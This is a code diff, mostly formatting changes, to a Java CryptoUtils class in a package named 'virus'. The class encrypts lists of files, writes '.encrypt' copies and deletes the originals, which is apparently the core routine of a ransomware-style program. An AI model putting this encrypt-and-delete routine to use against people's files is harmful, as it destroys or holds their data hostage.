@@ -1,6 +1,6 @@
 package com.virus.security;
 
-
+import com.virus.security.CryptoException;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
@@ -15,7 +15,6 @@ import javax.crypto.Cipher;
 import javax.crypto.IllegalBlockSizeException;
 import javax.crypto.NoSuchPaddingException;
 import javax.crypto.spec.SecretKeySpec;
-
 /**
  * Created by codertimo on 15. 11. 25..
  */
@@ -26,32 +25,31 @@ public class CryptoUtils {
 
     /**
      * 파일 암호화 메소드
-     *
      * @param key
      * @param inputFile
      * @param outputFile
      * @throws CryptoException
      */
-    public static void encrypt(String key, File inputFile, File outputFile) throws CryptoException {
+    public static void encrypt(String key, File inputFile, File outputFile)
+            throws CryptoException {
         doCrypto(Cipher.ENCRYPT_MODE, key, inputFile, outputFile);
     }
 
     /**
      * 파일 복호화 메소드
-     *
      * @param key
      * @param inputFile
      * @param outputFile
      * @throws CryptoException
      */
-    public static void decrypt(String key, File inputFile, File outputFile) throws CryptoException {
+    public static void decrypt(String key, File inputFile, File outputFile)
+            throws CryptoException {
         doCrypto(Cipher.DECRYPT_MODE, key, inputFile, outputFile);
     }
 
 
     /**
      * 암호화 알고리즘
-     *
      * @param cipherMode
      * @param key
      * @param inputFile
@@ -86,17 +84,20 @@ public class CryptoUtils {
 
     /**
      * 리스트 암호화 메소드
-     *
      * @param files
      * @param key
      */
-    public static void encrypt(ArrayList<File> files, String key) {
-        for (File file : files) {
+    public static void encrypt(ArrayList<File> files, String key)
+    {
+        for(File file : files)
+        {
             try {
                 File output = new File(file.getPath() + ".encrypt");
                 CryptoUtils.encrypt(key, file, output);
                 file.delete();
-            } catch (Exception e) {
+            }
+            catch (Exception e)
+            {
                 e.printStackTrace();
             }
         }
@@ -105,21 +106,25 @@ public class CryptoUtils {
 
     /**
      * 리스트 복호화 메소드
-     *
      * @param files
      * @param key
      */
-    public static void decrypt(ArrayList<File> files, String key) {
-        for (File file : files) {
+    public static void decrypt(ArrayList<File> files, String key)
+    {
+        for(File file : files)
+        {
             try {
                 String file_name = file.getPath().split(".encrypt")[0];
                 System.out.println(file_name);
                 File output = new File(file_name);
                 CryptoUtils.decrypt(key, file, output);
                 file.delete();
-            } catch (Exception e) {
+            }
+            catch (Exception e)
+            {
                 e.printStackTrace();
             }
         }
     }
+
 }
